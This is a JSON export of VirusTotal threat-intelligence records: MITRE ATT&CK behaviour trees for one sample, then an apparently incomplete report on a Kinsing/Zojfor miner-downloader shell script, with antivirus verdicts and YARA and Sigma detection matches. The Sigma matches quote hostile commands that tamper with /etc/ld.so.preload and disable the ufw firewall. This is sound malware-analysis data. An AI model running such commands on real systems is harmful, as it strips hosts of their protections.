                "description": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (services.exe) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as sc.exe and Net.\nPsExec can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API. Tools such as PsExec and sc.exe can accept remote servers as arguments and may be used to conduct remote execution.\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with Windows Service during service persistence or privilege escalation.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "modify service"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1569/002/",
                "id": "T1569.002",
                "name": "Service Execution"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "check if file exists"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              },
              {
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "The process has tried to detect the debugger probing the use of page guards."
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "The process attempted to detect a running debugger using common APIs"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1057/",
                "id": "T1057",
                "name": "Process Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., Valid Accounts).\nAdversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.\nFor examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default PowerShell and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system’s files.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "get session user name"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1087/",
                "id": "T1087",
                "name": "Account Discovery"
              },
              {
                "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "query or enumerate registry key"
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "query or enumerate registry value"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1012/",
                "id": "T1012",
                "name": "Query Registry"
              },
              {
                "description": "Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as sc query, tasklist /svc, systemctl --type=service, and net start.\nAdversaries may use the information from System Service Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "query service status"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1007/",
                "id": "T1007",
                "name": "System Service Discovery"
              },
              {
                "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nVarious utilities and commands may acquire this information, including whoami. In macOS and Linux, the currently logged in user can be identified with w and who. On macOS the dscl . list /Users | grep -v '_' command can also be used to enumerate user accounts. Environment variables, such as %USERNAME% and $USER, may also be used to access this information.\nOn network devices, Network Device CLI commands such as show users and show ssh can be used to display users currently logged into the device.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "get session user name"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1033/",
                "id": "T1033",
                "name": "System Owner/User Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk. Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).\nReflective code injection is very similar to Process Injection except that the “injection” loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "load .NET assembly"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1620/",
                "id": "T1620",
                "name": "Reflective Code Loading"
              },
              {
                "description": "Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows copy /b command to reassemble binary fragments into a malicious payload.\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Detected an attempt to pull out some data from the binary image"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1140/",
                "id": "T1140",
                "name": "Deobfuscate/Decode Files or Information"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: .sys) to disk, the payload can be loaded and registered via Native API functions such as CreateServiceW() (or manually via functions such as ZwLoadDriver() and ZwSetValueKey()), by creating the required service Registry values (i.e. Modify Registry), or by using command-line utilities such as PnPUtil.exe. Adversaries may leverage these drivers as Rootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of Exploitation for Privilege Escalation.\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through Service Execution. To make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component).",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "start service"
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "modify service"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1543/003/",
                "id": "T1543.003",
                "name": "Windows Service"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      },
      "CAPA": {
        "tactics": [
          {
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: .sys) to disk, the payload can be loaded and registered via Native API functions such as CreateServiceW() (or manually via functions such as ZwLoadDriver() and ZwSetValueKey()), by creating the required service Registry values (i.e. Modify Registry), or by using command-line utilities such as PnPUtil.exe. Adversaries may leverage these drivers as Rootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of Exploitation for Privilege Escalation.\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through Service Execution. To make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "start service"
                  },
                  {
                    "severity": "INFO",
                    "description": "modify service"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1543/003/",
                "id": "T1543.003",
                "name": "Windows Service"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "id": "TA0003",
            "name": "Persistence"
          },
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model (DCOM) and Windows Remote Management (WinRM). Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement.  ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "access WMI data in .NET"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1047/",
                "id": "T1047",
                "name": "Windows Management Instrumentation"
              },
              {
                "description": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (services.exe) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as sc.exe and Net.\nPsExec can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API. Tools such as PsExec and sc.exe can accept remote servers as arguments and may be used to conduct remote execution.\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with Windows Service during service persistence or privilege escalation.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "modify service"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1569/002/",
                "id": "T1569.002",
                "name": "Service Execution"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "check if file exists"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., Valid Accounts).\nAdversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.\nFor examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default PowerShell and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system’s files.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "get session user name"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1087/",
                "id": "T1087",
                "name": "Account Discovery"
              },
              {
                "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "query or enumerate registry value"
                  },
                  {
                    "severity": "INFO",
                    "description": "query or enumerate registry key"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1012/",
                "id": "T1012",
                "name": "Query Registry"
              },
              {
                "description": "Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as sc query, tasklist /svc, systemctl --type=service, and net start.\nAdversaries may use the information from System Service Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "query service status"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1007/",
                "id": "T1007",
                "name": "System Service Discovery"
              },
              {
                "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nVarious utilities and commands may acquire this information, including whoami. In macOS and Linux, the currently logged in user can be identified with w and who. On macOS the dscl . list /Users | grep -v '_' command can also be used to enumerate user accounts. Environment variables, such as %USERNAME% and $USER, may also be used to access this information.\nOn network devices, Network Device CLI commands such as show users and show ssh can be used to display users currently logged into the device.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "get session user name"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1033/",
                "id": "T1033",
                "name": "System Owner/User Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk. Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).\nReflective code injection is very similar to Process Injection except that the “injection” loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "load .NET assembly"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1620/",
                "id": "T1620",
                "name": "Reflective Code Loading"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: .sys) to disk, the payload can be loaded and registered via Native API functions such as CreateServiceW() (or manually via functions such as ZwLoadDriver() and ZwSetValueKey()), by creating the required service Registry values (i.e. Modify Registry), or by using command-line utilities such as PnPUtil.exe. Adversaries may leverage these drivers as Rootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of Exploitation for Privilege Escalation.\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through Service Execution. To make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "start service"
                  },
                  {
                    "severity": "INFO",
                    "description": "modify service"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1543/003/",
                "id": "T1543.003",
                "name": "Windows Service"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/453257c3494addafb39cb6815862403e827947a1e7737eb8168cd10522465deb/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "6596a6ba06bafd61c48fcc61"
  },
  "data": {
    "attributes": {
      "type_description": "Shell script",
      "tlsh": "T1B4622E8EB021ED74256DC4B59DE2287D602BA0094D623F10F8547E78B79DA04E7B9BFC",
      "type_tags": [
        "script",
        "shell"
      ],
      "crowdsourced_yara_results": [
        {
          "description": "Detects code found in report on exploits against CVE-2020-5902 F5 BIG-IP vulnerability by NCC group",
          "source": "https://github.com/Neo23x0/signature-base",
          "author": "Florian Roth (Nextron Systems)",
          "ruleset_name": "apt_f5_bigip_expl_payloads",
          "rule_name": "MAL_Payload_F5_BIG_IP_Exploitations_Jul20_1",
          "ruleset_id": "00098b0324"
        },
        {
          "ruleset_id": "0151a78cbb",
          "rule_name": "Linux_Trojan_Kinsing_2c1ffe78",
          "ruleset_name": "Linux_Trojan_Kinsing",
          "source": "https://github.com/elastic/protections-artifacts",
          "author": "Elastic Security"
        }
      ],
      "names": [
        "acb.sh"
      ],
      "last_modification_date": 1704144683,
      "type_tag": "shell",
      "times_submitted": 3,
      "total_votes": {
        "harmless": 0,
        "malicious": 0
      },
      "size": 15178,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.zojfor/shell",
        "popular_threat_category": [
          {
            "count": 13,
            "value": "trojan"
          },
          {
            "count": 10,
            "value": "miner"
          },
          {
            "count": 8,
            "value": "downloader"
          }
        ],
        "popular_threat_name": [
          {
            "count": 8,
            "value": "zojfor"
          },
          {
            "count": 4,
            "value": "shell"
          },
          {
            "count": 2,
            "value": "bash"
          }
        ]
      },
      "last_submission_date": 1702024582,
      "sigma_analysis_results": [
        {
          "rule_title": "Code Injection by ld.so Preload",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "0",
                "CommandLine": "chattr -i /etc/ld.so.preload",
                "Image": "chattr"
              }
            },
            {
              "values": {
                "EventID": "0",
                "CommandLine": "rm -f /etc/ld.so.preload",
                "Image": "rm"
              }
            }
          ],
          "rule_level": "high",
          "rule_id": "ef655b20c81f4dddb081e2c7fe6c60ee0ea86d7e37cdf55fe02cd0c8586de4d1",
          "rule_author": "Christian Burkard (Nextron Systems)",
          "rule_description": "Detects the ld.so preload persistence file. See `man ld.so` for more information."
        },
        {
          "rule_title": "Ufw Force Stop Using Ufw-Init",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "0",
                "CommandLine": "ufw disable",
                "Image": "ufw"
              }
            }
          ],
          "rule_level": "medium",
          "rule_id": "3b99cfddafbe928cbdbe1bffc59282013b9389bce664830e434b17c6c47769d5",
          "rule_author": "Joseliyo Sanchez, @Joseliyo_Jstnk",
          "rule_description": "Detects attempts to force stop the ufw using ufw-init"
        }
      ],
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.Script.Zojfor.4!c",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231208"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": "Linux.BtcMine.361",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "ClamAV": {
          "category": "malicious",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": "Txt.Malware.Sustes-6779550-1",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "Generic.Linux.Zojfor.C.F3AA21D0",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": "Script.trojan.A10876045",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Skyhigh": {
          "category": "malicious",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": "LINUX/Downloader.bz",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "LINUX/Downloader.bz",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5025",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Malware.Generic-Script.Save.ba227",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.132.50600",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.132.50601",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Generic.Linux.Zojfor.C.F3AA21D0",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231127"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.608",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "SymantecMobileInsight": {
          "category": "failure",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": "Trojan Horse",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28497",
          "result": "Linux/CoinMiner.OO",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.485",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "Trojan.SH.CVE20207961.SM",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "BV:Agent-BPH [Trj]",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.28",
          "result": "Malicious (score: 99)",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "HEUR:Trojan-Downloader.Shell.Miner.gen",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Generic.Linux.Zojfor.C.F3AA21D0",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Generic.Linux.Zojfor.C.F3AA21D0",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
